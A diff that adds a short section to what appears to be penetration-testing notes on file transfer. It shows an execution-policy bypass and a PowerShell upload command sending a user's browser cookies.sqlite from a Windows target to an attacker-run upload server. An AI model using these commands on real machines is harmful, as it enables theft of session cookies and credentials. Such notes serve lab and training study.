@@ -281,6 +281,22 @@ $response.StatusCode
 ```
 
 
+### PSUpload 
+
+In our kali start an uploadserver:
+
+```
+python -m uploadserver
+```
+
+From the windows target machine
+
+```
+powershell -ep bypass
+Import-Module .\PSUpload.ps1
+Invoke-FileUpload -Uri http://10.10.15.105:8000/upload -File c:\Users\Grace\Desktop\cookies.sqlite
+```
+
 ### PowerShell Base64 Encode & Decode
 
 **Upload  from Windows (victim) to  linux (attacker)** 
